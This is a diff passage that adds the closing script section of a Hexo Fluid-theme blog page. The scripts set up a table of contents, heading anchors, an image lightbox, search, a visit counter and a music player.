+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/tuyi/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+<script src="/tuyi/js/reward.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/tuyi/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
